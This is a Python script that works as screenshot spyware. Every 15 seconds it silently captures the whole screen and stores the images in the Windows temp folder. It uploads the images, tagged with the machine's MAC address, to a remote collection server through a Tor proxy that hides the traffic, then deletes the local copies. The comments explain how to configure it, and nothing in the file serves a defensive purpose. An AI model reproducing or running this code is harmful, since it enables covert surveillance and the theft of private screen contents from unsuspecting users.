import requests # to send screenshots
import threading # to make screenshot sending repeat in background
import mss # to screenshot
import mss.tools
import os
from contextlib import ExitStack # to close screenshots properly
from datetime import datetime, timezone # to classify screenshots by time sent
from getmac import get_mac_address # to get mac address

URL = 'http://10.0.2.2:8000' # the URL/IP to which you want to send the logs to
SCREENSHOT_INTERVAL = 15.0 # Interval between taking screenshots (in seconds).
SEND_COUNT = 2 # How many screenshots need to be taken before sending.
MAC = get_mac_address().replace(':', '') # store mac address
os.environ['HTTP_PROXY'] = 'socks5h://127.0.0.1:9050' # set global proxy variables so all requests automatically go through the Tor SOCKS5 proxy without having to specify it in every request
os.environ['HTTPS_PROXY'] = 'socks5h://127.0.0.1:9050' # ^

screenshots = []
# Make sure the screenshot&send count combo don't make the sending interval
# (screenshot interval * send count) too low so you don't DDOS yourself

def screenshot():
    with mss.mss() as sct:
        time = str(datetime.now(timezone.utc))[:-13].replace(':','.') # get the current utc time, remove milliseconds portion, and switch colons to periods since you cant use colons in file names
        ss = sct.grab(sct.monitors[0]) # take a screenshot
        screenshot_name = f"C:/Windows/Temp/screenshot-{time}.png"
        mss.tools.to_png(ss.rgb, ss.size, output=screenshot_name) # save the screenshot
        screenshots.append(screenshot_name) # add the screenshot to the list
    if len(screenshots) >= SEND_COUNT: # if the number of screenshots has passed the threshhold send the screenshots
        send_screenshot()
    threading.Timer(SCREENSHOT_INTERVAL, screenshot).start() # make the function run again after the amount of seconds specified in SCREENSHOT_INTERVAL
    
def send_screenshot():
    count = len(screenshots) # Assume new screenshots were added which you haven't sent yet and log how many you're sending so you know how many to remove later
    ss_payload = {} # progressively add more screenshots to the payload
    i = 1
    with ExitStack() as stack:
        for ss in screenshots[:count-1]:
            img = stack.enter_context(open(ss, 'rb')) # open the screenshot in read-only mode binary
            ss_payload["files"] = (os.path.basename(ss), img, 'image/png') # make the payload for the screenshot containing its name, the screenshot in binary, and its MIME type and add it to the list of the payload
            i += 1 # add 1 to the counter so the screenshot keys enumerate ex. {'file1:(..),file2:(..), and so on'}
        r = requests.post(URL, headers={'mac':MAC}, files=ss_payload) # POST (send) the screenshot
    if not 300 > r.status_code >= 200: # if POSTing the screenshots failed, don't delete them and try again later
        pass
    else:
        for file in screenshots[:count-1]:
            os.remove(file) # remove leftover files
        del screenshots[:count-1] # remove the deleted files from the list

screenshot()